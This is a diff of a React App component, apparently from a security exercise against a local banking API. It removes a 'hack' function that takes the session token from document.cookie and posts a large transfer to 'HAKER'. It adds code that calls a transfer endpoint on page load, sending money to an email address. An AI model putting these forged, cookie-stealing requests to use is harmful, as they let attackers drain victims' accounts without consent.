@@ -5,25 +5,12 @@ import './App.css';
 function App() {
     const [data, setData] = React.useState("null");
 
-    const hack = async () => {
-        const test = await fetch('http://localhost:8000/transfer', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                "Authorization": "Bearer " + document.cookie.split("=")[1]
-            },
-            body: JSON.stringify({
-                "amount": 500000000,
-                "to": "HAKER",
-                "from": "TVOJ_RACUN"
-            })
-        })
-        const response = await test.json();
-        setData(response);
-    }
-
     useEffect(() => {
-        hack();
+        fetch('/api/transfer?amount=100&to=jjurenic@mail.com').then((response) => {
+            return response.json();
+        }).then((data) => {
+            setData(data);
+        });
     }, []);
 
   return (
